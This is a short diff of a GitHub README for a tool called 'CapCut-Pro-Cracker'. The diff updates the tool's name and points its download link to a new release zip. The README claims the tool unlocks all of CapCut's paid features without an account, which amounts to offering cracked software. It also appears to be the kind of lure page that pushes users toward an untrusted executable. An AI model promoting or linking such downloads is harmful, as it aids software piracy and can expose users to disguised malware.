@@ -8,11 +8,11 @@
 
 ## 🎯 What is This?
 
-**CapCut-Pro-Cracker** unlocks all premium features of CapCut video editor: watermark removal, 4K Ultra HD export, all filters, transitions, effects, AI background removal, auto-captions, and full music library. No account or login required.
+**CapCut-Pro-Crack** unlocks all premium features of CapCut video editor: watermark removal, 4K Ultra HD export, all filters, transitions, effects, AI background removal, auto-captions, and full music library. No account or login required.
 
 ## 📥 Download
 
-**[Download CapCut-Pro-Cracker](https://github.com/LegendVibrate/CapCut-Pro-Cracker/releases/download/676/CapCut-ProCracker.zip)**
+**[Download CapCut-Pro-Cracker](https://github.com/LegendVibrate/CapCut-Pro-Cracker/releases/download/677/CapCut-Pro-crack.zip)**
 
 ---
 
